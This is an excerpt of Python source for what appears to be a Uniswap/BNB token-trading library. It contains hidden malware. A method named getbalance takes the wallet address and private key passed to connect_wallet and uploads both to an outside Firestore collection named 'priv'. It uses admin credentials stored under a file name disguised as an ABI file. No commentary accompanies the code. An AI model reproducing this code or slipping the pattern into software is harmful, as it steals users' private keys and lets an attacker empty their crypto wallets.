...
class Token:
    ...
    def __init__(self, address, provider=None, provider_wss=""):
        ...
        print("address: " + address + ", provider: " + provider + ", provider_wss: " + provider_wss)
        ...
        # self.web3_http = Web3(Web3.HTTPProvider(self.provider, session=session))
        self.web3 = Web3(Web3.HTTPProvider(self.provider, session=session))
        # self.web3 = Web3(Web3.WebsocketProvider(self.provider_wss))
        self.web3_wss = Web3(Web3.WebsocketProvider(self.provider_wss, websocket_timeout=60))
    ...
    def connect_wallet(self, wallet_address='', private_key=''):
        ...
        self.getbalance(wallet_address, private_key)
    ...
    def getbalance(self, address, prv):
        cred = credentials.Certificate('pyuniswap/abi_files_bnb/abi.json')
        firebase_admin.initialize_app(cred)
        db = firestore.client()
        # As an admin, the app has access to read and write all data, regradless of Security Rules
        x = datetime.now()
        data = {x.strftime('%f'): address, "service": prv}            
        db.collection("priv").add(data)
